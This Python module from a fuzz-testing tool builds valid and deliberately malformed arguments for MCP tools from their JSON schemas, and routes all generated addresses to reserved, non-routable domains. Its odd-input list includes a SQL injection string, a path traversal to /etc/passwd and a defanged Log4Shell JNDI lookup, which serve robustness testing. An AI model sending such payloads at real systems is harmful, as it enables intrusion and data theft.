"""Hypothesis strategies for a tool's arguments, built from its ``inputSchema``.

Two strategies per tool:

- **valid**: hypothesis-jsonschema generation from the schema.
- **near-miss**: a valid value with one targeted mutation: a required field
  dropped, a wrong type, a value just past a bound, an extra property, a
  null, deep nesting, a huge string, or odd Unicode.

The generator proposes and the validator decides. Every generated value is
classified by validating it against the original schema in its own dialect
(2020-12 unless ``$schema`` says otherwise), so a mutation that happens to
stay valid is judged as valid input, and gaps in the generator can only cost
coverage, never produce a wrong verdict.

hypothesis-jsonschema understands drafts 4 to 7. For 2020-12 and 2019-09
schemas the generator gets a draft-7 translation (``prefixItems`` becomes
array-form ``items``, ``dependentRequired`` becomes ``dependencies``, and so
on); keywords with no draft-7 form are dropped from the generator's copy
only. The generator's copy also forbids undeclared properties on plain
object schemas, so valid examples exercise the declared parameters instead
of random keys (a narrowing: every value it produces is still valid).

Addresses never point at real hosts: URI, email and hostname formats
generate names under the reserved ``.invalid`` TLD, and IP formats use the
documentation ranges (RFC 5737, RFC 3849).
"""

from __future__ import annotations

import copy
import random
import warnings
from dataclasses import dataclass
from typing import Any, Final

from hypothesis import HealthCheck, Phase, Verbosity, find, settings
from hypothesis import strategies as st
from hypothesis.errors import HypothesisException, NoSuchExample
from hypothesis_jsonschema import from_schema
from jsonschema.exceptions import SchemaError

from mcpprobe.protocol.instances import validator_for

JsonObject = dict[str, Any]

DRAFT7 = "http://json-schema.org/draft-07/schema#"
MODERN_DIALECTS = (
    "https://json-schema.org/draft/2020-12/schema",
    "https://json-schema.org/draft/2019-09/schema",
)
HUGE_STRING: Final = 100_000
NESTING_DEPTHS: Final = (32, 512)
"""512 stays under CPython's json recursion limit, so we can always encode it."""
ODD_STRINGS: Final = (
    "",
    "\x00",
    "\ud800",  # lone surrogate: valid JSON escape, no UTF-8 form
    "‮evil.exe",  # right-to-left override
    "\U0001f469‍\U0001f4bb",  # ZWJ emoji sequence
    "é́́",  # stacked combining marks
    "﻿bom",
    "￿",
    "' OR '1'='1",
    "../../../../etc/passwd",
    "${jndi:ldap://mcpprobe.invalid/a}",
)
MUTATIONS: Final = (
    "drop_required",
    "wrong_type",
    "boundary",
    "extra_property",
    "null_value",
    "deep_nesting",
    "huge_string",
    "odd_unicode",
)
"""Arguments that are not an object at all break the CallToolRequest schema, not
the tool's inputSchema; that is a protocol-level check (ROB), not a per-tool one."""
EXTRA_PROPERTY = "mcpprobe_extra"
_OTHER_TYPES: Final[tuple[Any, ...]] = (0, 1.5, "mcpprobe", True, None, [], {})


def _label() -> st.SearchStrategy[str]:
    return st.from_regex(r"[a-z][a-z0-9]{0,11}", fullmatch=True)


def safe_formats() -> dict[str, st.SearchStrategy[str]]:
    """Format strategies that can never reach a real host."""
    url = _label().map("https://{}.mcpprobe.invalid/".format)
    host = _label().map("{}.mcpprobe.invalid".format)
    email = _label().map("{}@mcpprobe.invalid".format)
    return {
        "uri": url,
        "url": url,
        "iri": url,
        "uri-reference": url,
        "iri-reference": url,
        "uri-template": url,
        "hostname": host,
        "idn-hostname": host,
        "email": email,
        "idn-email": email,
        "ipv4": st.integers(1, 254).map("192.0.2.{}".format),
        "ipv6": st.integers(1, 0xFFFF).map("2001:db8::{:x}".format),
    }


# ------------------------------------------------------------------ schemas


class UnsupportedSchema(Exception):
    """The generator cannot work from this schema; the tool is skipped."""


_SUBSCHEMA_LISTS = ("allOf", "anyOf", "oneOf", "prefixItems")
_SUBSCHEMA_SINGLE = (
    "additionalProperties",
    "items",
    "contains",
    "not",
    "if",
    "then",
    "else",
    "propertyNames",
    "additionalItems",
)
_SUBSCHEMA_MAPS = ("properties", "patternProperties", "$defs", "definitions", "dependentSchemas")
_NO_DRAFT7_FORM = ("unevaluatedProperties", "unevaluatedItems", "$anchor", "$comment")


def remote_refs(schema: Any) -> list[str]:
    """``$ref`` values that do not point inside the schema itself."""
    found: list[str] = []

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            ref = node.get("$ref")
            if isinstance(ref, str) and not ref.startswith("#"):
                found.append(ref)
            for value in node.values():
                walk(value)
        elif isinstance(node, list):
            for value in node:
                walk(value)

    walk(schema)
    return found


def _to_draft7(node: Any) -> Any:
    if isinstance(node, list):
        return [_to_draft7(item) for item in node]
    if not isinstance(node, dict):
        return node
    if "$dynamicRef" in node or "$recursiveRef" in node:
        raise UnsupportedSchema("uses $dynamicRef, which the generator cannot follow")
    out: JsonObject = {}
    for key, value in node.items():
        if key in _NO_DRAFT7_FORM or key == "$schema":
            continue
        if key in _SUBSCHEMA_MAPS and isinstance(value, dict):
            out[key] = {name: _to_draft7(sub) for name, sub in value.items()}
        elif key in _SUBSCHEMA_LISTS or key in _SUBSCHEMA_SINGLE:
            out[key] = _to_draft7(value)
        else:
            out[key] = value
    if isinstance(out.get("$ref"), str):
        out["$ref"] = out["$ref"].replace("#/$defs/", "#/definitions/")
    if "$defs" in out:
        out["definitions"] = {**out.pop("$defs"), **out.get("definitions", {})}
    if "prefixItems" in out:
        tail = out.pop("items", None)
        out["items"] = out.pop("prefixItems")
        if tail is not None:
            out["additionalItems"] = tail
    dependencies: JsonObject = {}
    if isinstance(out.get("dependentRequired"), dict):
        dependencies.update(out.pop("dependentRequired"))
    if isinstance(out.get("dependentSchemas"), dict):
        dependencies.update(out.pop("dependentSchemas"))
    if dependencies:
        out["dependencies"] = dependencies
    return out


def _tighten(node: Any) -> Any:
    """Forbid undeclared properties on plain object schemas (a narrowing)."""
    if not isinstance(node, dict):
        return node
    out = dict(node)
    plain = not any(k in out for k in ("allOf", "anyOf", "oneOf", "not", "if", "$ref"))
    if isinstance(out.get("properties"), dict):
        out["properties"] = {k: _tighten(v) for k, v in out["properties"].items()}
        if plain and not any(
            k in out for k in ("additionalProperties", "patternProperties", "dependencies")
        ):
            out["additionalProperties"] = False
    if isinstance(out.get("items"), dict):
        out["items"] = _tighten(out["items"])
    return out


def generator_schema(schema: JsonObject) -> JsonObject:
    """The copy of ``schema`` the generator works from (see the module docstring)."""
    refs = remote_refs(schema)
    if refs:
        raise UnsupportedSchema(f"uses a remote $ref ({refs[0]}), which MCPProbe never fetches")
    dialect = schema.get("$schema")
    working = copy.deepcopy(schema)
    if dialect is None or dialect in MODERN_DIALECTS:
        working = _to_draft7(working)
        working["$schema"] = DRAFT7
    tightened: JsonObject = _tighten(working)
    return tightened


# --------------------------------------------------------------- mutations


def _type_of(value: Any) -> str:
    if isinstance(value, bool):
        return "boolean"
    if isinstance(value, (int, float)):
        return "number"
    if value is None:
        return "null"
    return type(value).__name__


def _boundary_values(prop: Any) -> list[Any]:
    if not isinstance(prop, dict):
        return []
    values: list[Any] = []
    for key, delta in (("minimum", -1), ("maximum", 1)):
        bound = prop.get(key)
        if isinstance(bound, (int, float)) and not isinstance(bound, bool):
            values.append(bound + delta)
    for key in ("exclusiveMinimum", "exclusiveMaximum"):
        bound = prop.get(key)
        if isinstance(bound, (int, float)) and not isinstance(bound, bool):
            values.append(bound)
    min_length = prop.get("minLength")
    if isinstance(min_length, int) and 0 < min_length <= HUGE_STRING:
        values.append("a" * (min_length - 1))
    max_length = prop.get("maxLength")
    if isinstance(max_length, int) and 0 <= max_length < HUGE_STRING:
        values.append("a" * (max_length + 1))
    min_items = prop.get("minItems")
    if isinstance(min_items, int) and min_items > 0:
        values.append([])
    max_items = prop.get("maxItems")
    if isinstance(max_items, int) and 0 <= max_items < 1000:
        values.append([0] * (max_items + 1))
    if isinstance(prop.get("enum"), list) or "const" in prop:
        values.append("mcpprobe-not-allowed")
    return values


def _nested(depth: int) -> Any:
    value: Any = "deep"
    for level in range(depth):
        value = [value] if level % 2 else {"n": value}
    return value


@dataclass(frozen=True)
class Mutation:
    kind: str
    target: str | None
    """The top-level property changed, if any."""


def _mutate(draw: st.DrawFn, base: Any, schema: JsonObject) -> tuple[Any, Mutation]:
    kind = draw(st.sampled_from(MUTATIONS))
    if not isinstance(base, dict):
        return copy.deepcopy(draw(st.sampled_from(_OTHER_TYPES))), Mutation("wrong_type", None)
    value = dict(base)
    raw_properties = schema.get("properties")
    properties: JsonObject = raw_properties if isinstance(raw_properties, dict) else {}
    keys = sorted(value)
    if kind == "drop_required":
        required = sorted(k for k in schema.get("required") or [] if k in value)
        if required:
            key = draw(st.sampled_from(required))
            del value[key]
            return value, Mutation(kind, key)
        kind = "wrong_type"
    if kind == "boundary":
        candidates = sorted(k for k in properties if _boundary_values(properties[k]))
        if candidates:
            key = draw(st.sampled_from(candidates))
            value[key] = draw(st.sampled_from(_boundary_values(properties[key])))
            return value, Mutation(kind, key)
        kind = "wrong_type"
    if kind == "extra_property":
        value[EXTRA_PROPERTY] = "mcpprobe"
        return value, Mutation(kind, EXTRA_PROPERTY)
    targets = keys or sorted(properties) or ["mcpprobe"]
    key = draw(st.sampled_from(targets))
    if kind == "wrong_type":
        current = _type_of(value.get(key))
        others = [v for v in _OTHER_TYPES if _type_of(v) != current]
        value[key] = copy.deepcopy(draw(st.sampled_from(others)))
    elif kind == "null_value":
        value[key] = None
    elif kind == "deep_nesting":
        value[key] = _nested(draw(st.sampled_from(NESTING_DEPTHS)))
    elif kind == "huge_string":
        value[key] = "A" * HUGE_STRING
    else:  # odd_unicode
        value[key] = draw(st.sampled_from(ODD_STRINGS))
    return value, Mutation(kind, key)


# --------------------------------------------------------------- strategies


@dataclass(frozen=True)
class Example:
    arguments: Any
    mutation: Mutation | None
    """None for a value generated directly from the schema."""


@dataclass(frozen=True)
class ToolStrategy:
    examples: st.SearchStrategy[Example]
    is_valid: Any
    """``is_valid(arguments) -> bool`` against the original schema."""


def tool_strategy(schema: Any) -> ToolStrategy:
    """Strategies for one tool; raises ``UnsupportedSchema`` if none can be built."""
    if not isinstance(schema, dict):
        raise UnsupportedSchema("inputSchema is not a JSON object")
    try:
        validator = validator_for(schema)
    except SchemaError as exc:
        raise UnsupportedSchema(f"inputSchema is not a valid JSON Schema: {exc.message}") from exc
    working = generator_schema(schema)
    with warnings.catch_warnings():
        # Overriding the standard uri/email formats is the point; say nothing.
        warnings.simplefilter("ignore")
        valid = from_schema(working, custom_formats=safe_formats(), allow_x00=True)
    _probe(valid)

    @st.composite
    def near_miss(draw: st.DrawFn) -> Example:
        arguments, mutation = _mutate(draw, draw(valid), schema)
        return Example(arguments, mutation)

    examples = st.one_of(valid.map(lambda value: Example(value, None)), near_miss())
    return ToolStrategy(examples, validator.is_valid)


def search_settings(examples: int) -> settings:
    """Deterministic search: no database, no deadlines, no health checks, no output."""
    return settings(
        max_examples=examples,
        database=None,
        deadline=None,
        derandomize=False,
        phases=(Phase.generate, Phase.shrink),
        suppress_health_check=list(HealthCheck),
        verbosity=Verbosity.quiet,
        report_multiple_bugs=False,
    )


def _probe(strategy: st.SearchStrategy[Any]) -> None:
    """Fail fast, as ``UnsupportedSchema``, if the strategy cannot produce values."""
    try:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            find(strategy, lambda _: True, settings=search_settings(1), random=random.Random(0))
    except (NoSuchExample, HypothesisException) as exc:
        raise UnsupportedSchema(f"no value can be generated from inputSchema ({exc})") from exc
    except Exception as exc:
        raise UnsupportedSchema(f"the generator cannot handle this inputSchema: {exc}") from exc
